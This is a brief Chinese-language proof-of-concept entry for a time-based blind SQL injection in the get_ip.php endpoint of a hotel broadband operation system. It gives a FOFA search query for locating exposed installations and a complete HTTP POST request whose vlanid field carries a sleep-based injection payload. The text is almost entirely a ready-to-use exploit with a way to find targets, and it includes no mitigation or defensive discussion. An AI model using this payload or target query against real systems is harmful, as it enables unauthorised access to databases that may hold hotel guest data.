## 安美数字酒店宽带运营系统get_ip.phpSQL注入漏洞


## fofa
```
title=酒店宽带运营系统
```

## POC
```
POST /user/get_ip.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
Content-Length: 263
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
Connection: Keep-alive

lang=GB&gwip=1&realip=1&vlanid=1'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z
```
